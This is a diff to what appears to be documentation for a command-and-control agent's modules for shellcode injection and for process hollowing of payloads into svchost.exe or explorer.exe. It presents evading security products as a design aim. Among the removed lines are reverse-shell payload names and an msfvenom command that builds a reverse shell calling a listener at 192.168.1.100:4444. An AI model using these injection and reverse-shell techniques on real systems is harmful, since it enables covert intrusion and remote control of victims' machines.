@@ -235,13 +235,6 @@ When technique=auto, multiple shellcode injection technques are tried ordered by
 4. Once successful injection occurs, the shellcode runs in the target process, and the agent reports success back to the C2 server. The agent properly closes handles and cleans up resources.
 5. The multiple technique approach ensures the agent can adapt to different security configurations and increases the likelihood of successful injection when some techniques are blocked by security products.
 
-#### Supported Payloads
-- windows/x64/meterpreter/reverse_tcp
-- windows/x64/shell_reverse_tcp
-- windows/x64/exec
-- Small-sized custom raw shellcode
-
-
 ## PEInject
 
 This module interfaces with an agent and enables In-memory Injection of an unmanaged PE(Portable Executable) using Process Hollowing into a sacrificial process
@@ -252,25 +245,20 @@ This module interfaces with an agent and enables In-memory Injection of an unman
 
 #### Usage
 1. Generate compatible PE payload using msfvenom
-2. Place the PE file in the `cli/extensions/` directory 
+2. Place the PE file in the `cli/extensions/pe/` directory 
 3. Parse the `pe_file` name (path will be resolved automatically) as a required argument of the peinject module
 4. The agent will in-memory inject this into either svchost.exe or explorer.exe using Process Hollowing
 
-#### msfvenom Command Syntax
+#### Command Syntax
 
 ```
-# msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o payload.exe
-
-peinject pe_file=<payload_filename> # METHOD - 1 (Interactive mode) - File will be resolved automatically
-run peinject pe_file=<payload_filename> [agent_id=<agent_id>] # METHOD - 2 (Non-interactive mode)
+modules info peinject
+# In interactive mode, the agent ID is automatically inferred:
+peinject <payload_filename> [agent_id=<agent_id>] 
 
 # Examples:
-
 peinject payload.exe
 peinject payload.exe agent_id=abc123-4567-8901-2345-67890abcdef1
-
-peinject pe_file=payload.exe
-peinject pe_file=payload.exe agent_id=abc123-4567-8901-2345-67890abcdef1
 ```
 
 #### PE Injection Flow
